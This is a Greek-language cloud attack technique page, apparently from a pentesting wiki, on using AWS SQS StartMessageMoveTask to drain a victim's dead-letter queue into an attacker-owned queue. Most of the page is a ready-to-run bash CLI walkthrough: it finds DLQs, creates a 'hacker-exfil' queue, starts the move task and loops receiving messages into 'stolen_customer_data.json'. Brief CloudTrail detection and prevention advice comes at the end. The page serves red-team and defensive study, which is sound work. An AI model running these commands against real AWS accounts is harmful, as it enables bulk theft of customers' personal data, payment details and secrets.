# AWS – SQS DLQ Redrive Εξαγωγή μέσω StartMessageMoveTask

## Περιγραφή

Καταχράσου τα tasks μετακίνησης μηνυμάτων του SQS για να κλέψεις όλα τα συσσωρευμένα μηνύματα από την Dead-Letter Queue (DLQ) του θύματος αναδρομολογώντας τα σε μια ουρά υπό έλεγχο του επιτιθέμενου χρησιμοποιώντας `sqs:StartMessageMoveTask`. Αυτή η τεχνική εκμεταλλεύεται τη νόμιμη λειτουργία ανάκτησης μηνυμάτων του AWS για να εξαγάγει ευαίσθητα δεδομένα που έχουν συσσωρευτεί σε DLQs με την πάροδο του χρόνου.

## What is a Dead-Letter Queue (DLQ)?

Μια Dead-Letter Queue είναι μια ειδική ουρά SQS όπου στέλνονται αυτόματα τα μηνύματα όταν αποτυγχάνουν να επεξεργαστούν επιτυχώς από την κύρια εφαρμογή. Αυτά τα αποτυχημένα μηνύματα συχνά περιέχουν:
- Ευαίσθητα δεδομένα εφαρμογής που δεν μπόρεσαν να επεξεργαστούν
- Λεπτομέρειες σφαλμάτων και πληροφορίες debugging
- Personal Identifiable Information (PII)
- API tokens, credentials ή άλλα μυστικά
- Επιχειρησιακά κρίσιμα δεδομένα συναλλαγών

Οι DLQs λειτουργούν ως «νεκροταφείο» για αποτυχημένα μηνύματα, καθιστώντας τις πολύτιμους στόχους αφού συσσωρεύουν ευαίσθητα δεδομένα με την πάροδο του χρόνου που οι εφαρμογές δεν μπόρεσαν να χειριστούν σωστά.

## Attack Scenario

**Πραγματικό παράδειγμα:**
1. **E-commerce application** επεξεργάζεται παραγγελίες πελατών μέσω SQS
2. **Κάποιες παραγγελίες αποτυγχάνουν** (προβλήματα πληρωμών, θέματα αποθέματος κ.λπ.) και μετακινούνται σε DLQ
3. **Η DLQ συσσωρεύει** εβδομάδες/μήνες αποτυχημένων παραγγελιών που περιέχουν δεδομένα πελατών: `{"customerId": "12345", "creditCard": "4111-1111-1111-1111", "orderTotal": "$500"}`
4. **Ο επιτιθέμενος αποκτά πρόσβαση** σε AWS credentials με δικαιώματα SQS
5. **Ο επιτιθέμενος ανακαλύπτει** ότι η DLQ περιέχει χιλιάδες αποτυχημένες παραγγελίες με ευαίσθητα δεδομένα
6. **Αντί να προσπαθήσει να αποκτήσει πρόσβαση σε μεμονωμένα μηνύματα** (αργό και προφανές), ο επιτιθέμενος χρησιμοποιεί `StartMessageMoveTask` για να μεταφέρει μαζικά ΟΛΑ τα μηνύματα στην δική του ουρά
7. **Ο επιτιθέμενος εξάγει** όλα τα ιστορικά ευαίσθητα δεδομένα σε μία ενέργεια

## Requirements
- Η source queue πρέπει να είναι διαμορφωμένη ως DLQ (αναφερόμενη από τουλάχιστον μία ουρά RedrivePolicy).
- IAM permissions (εκτελείται ως το συμβιβασμένο victim principal):
- Στην DLQ (source): `sqs:StartMessageMoveTask`, `sqs:GetQueueAttributes`.
- Στην destination queue: δικαίωμα παράδοσης μηνυμάτων (π.χ. policy ουράς που επιτρέπει `sqs:SendMessage` από το victim principal). Για προορισμούς στο ίδιο account αυτό συνήθως επιτρέπεται από προεπιλογή.
- Αν είναι ενεργοποιημένο SSE-KMS: στο source CMK `kms:Decrypt`, και στο destination CMK `kms:GenerateDataKey`, `kms:Encrypt`.

## Impact
Εξαγωγή ευαίσθητων payloads που έχουν συσσωρευτεί σε DLQs (αποτυχημένα events, PII, tokens, payloads εφαρμογών) με υψηλή ταχύτητα χρησιμοποιώντας native SQS APIs. Λειτουργεί cross-account εάν το policy της destination queue επιτρέπει `SendMessage` από το victim principal.

## How to Abuse

- Εντόπισε το victim DLQ ARN και επιβεβαίωσε ότι αναφέρεται πράγματι ως DLQ από κάποια ουρά (οποιαδήποτε ουρά είναι εντάξει).
- Δημιούργησε ή επίλεξε μια ουρά υπό έλεγχο του επιτιθέμενου ως destination και πάρε το ARN της.
- Ξεκίνησε ένα message move task από την victim DLQ προς την destination queue σου.
- Παρακολούθησε την πρόοδο ή ακύρωσε αν χρειαστεί.

### CLI Example: Exfiltrating Customer Data from E-commerce DLQ

**Scenario**: Ένας επιτιθέμενος έχει συμβιβάσει AWS credentials και ανακάλυψε ότι μια e-commerce εφαρμογή χρησιμοποιεί SQS με μια DLQ που περιέχει αποτυχημένες προσπάθειες επεξεργασίας παραγγελιών πελατών.

1) **Ανίχνευση και εξέταση της victim DLQ**
```bash
# List queues to find DLQs (look for names containing 'dlq', 'dead', 'failed', etc.)
aws sqs list-queues --queue-name-prefix dlq

# Let's say we found: https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq
VICTIM_DLQ_URL="https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq"
SRC_ARN=$(aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

# Check how many messages are in the DLQ (potential treasure trove!)
aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" \
--attribute-names ApproximateNumberOfMessages
# Output might show: "ApproximateNumberOfMessages": "1847"
```
2) **Δημιουργήστε attacker-controlled destination queue**
```bash
# Create our exfiltration queue
ATTACKER_Q_URL=$(aws sqs create-queue --queue-name hacker-exfil-$(date +%s) --query QueueUrl --output text)
ATTACKER_Q_ARN=$(aws sqs get-queue-attributes --queue-url "$ATTACKER_Q_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

echo "Created exfiltration queue: $ATTACKER_Q_ARN"
```
3) **Εκτέλεση της μαζικής κλοπής μηνυμάτων**
```bash
# Start moving ALL messages from victim DLQ to our queue
# This operation will transfer thousands of failed orders containing customer data
echo "Starting bulk exfiltration of $SRC_ARN to $ATTACKER_Q_ARN"
TASK_RESPONSE=$(aws sqs start-message-move-task \
--source-arn "$SRC_ARN" \
--destination-arn "$ATTACKER_Q_ARN" \
--max-number-of-messages-per-second 100)

echo "Move task started: $TASK_RESPONSE"

# Monitor the theft progress
aws sqs list-message-move-tasks --source-arn "$SRC_ARN" --max-results 10
```
4) **Συλλογή των κλεμμένων ευαίσθητων δεδομένων**
```bash
# Receive the exfiltrated customer data
echo "Receiving stolen customer data..."
aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--attribute-names All --message-attribute-names All \
--max-number-of-messages 10 --wait-time-seconds 5

# Example of what an attacker might see:
# {
#   "Body": "{\"customerId\":\"cust_12345\",\"email\":\"john@example.com\",\"creditCard\":\"4111-1111-1111-1111\",\"orderTotal\":\"$299.99\",\"failureReason\":\"Payment declined\"}",
#   "MessageId": "12345-abcd-6789-efgh"
# }

# Continue receiving all messages in batches
while true; do
MESSAGES=$(aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--max-number-of-messages 10 --wait-time-seconds 2 --output json)

if [ "$(echo "$MESSAGES" | jq '.Messages | length')" -eq 0 ]; then
echo "No more messages - exfiltration complete!"
break
fi

echo "Received batch of stolen data..."
# Process/save the stolen customer data
echo "$MESSAGES" >> stolen_customer_data.json
done
```
### Σημειώσεις μεταξύ λογαριασμών
- Η ουρά προορισμού πρέπει να έχει resource policy που επιτρέπει στον principal του θύματος να `sqs:SendMessage` (και, αν χρησιμοποιούνται, KMS grants/permissions).

## Γιατί αυτή η επίθεση είναι αποτελεσματική

1. **Νόμιμη λειτουργία του AWS**: Χρησιμοποιεί ενσωματωμένη λειτουργικότητα του AWS, καθιστώντας δύσκολη την ανίχνευση ως κακόβουλη
2. **Μαζική λειτουργία**: Μεταφέρει χιλιάδες μηνύματα γρήγορα αντί για αργή μεμονωμένη πρόσβαση
3. **Ιστορικά δεδομένα**: Οι DLQs συσσωρεύουν ευαίσθητα δεδομένα για εβδομάδες/μήνες
4. **Κάτω από το ραντάρ**: Πολλές οργανώσεις δεν παρακολουθούν στενά την πρόσβαση σε DLQ
5. **Cross-Account Capable**: Μπορεί να εξάγει (exfiltrate) σε δικό του AWS account του attacker εάν οι άδειες το επιτρέπουν

## Ανίχνευση και Πρόληψη

### Ανίχνευση
Παρακολουθήστε το CloudTrail για ύποπτες κλήσεις API `StartMessageMoveTask`:
```json
{
"eventName": "StartMessageMoveTask",
"sourceIPAddress": "suspicious-ip",
"userIdentity": {
"type": "IAMUser",
"userName": "compromised-user"
},
"requestParameters": {
"sourceArn": "arn:aws:sqs:us-east-1:123456789012:sensitive-dlq",
"destinationArn": "arn:aws:sqs:us-east-1:attacker-account:exfil-queue"
}
}
```
### Πρόληψη
1. **Ελάχιστα προνόμια**: Περιορίστε τα δικαιώματα `sqs:StartMessageMoveTask` μόνο σε απαραίτητους ρόλους
2. **Παρακολούθηση DLQs**: Ρυθμίστε συναγερμούς CloudWatch για ασυνήθιστη δραστηριότητα σε DLQs
3. **Πολιτικές μεταξύ λογαριασμών**: Ελέγξτε προσεκτικά τις πολιτικές ουρών SQS που επιτρέπουν πρόσβαση μεταξύ λογαριασμών
4. **Κρυπτογράφηση DLQs**: Χρησιμοποιήστε SSE-KMS με περιορισμένες πολιτικές κλειδιών
5. **Τακτικός καθαρισμός**: Μην αφήνετε ευαίσθητα δεδομένα να συσσωρεύονται στα DLQs επ' αόριστον
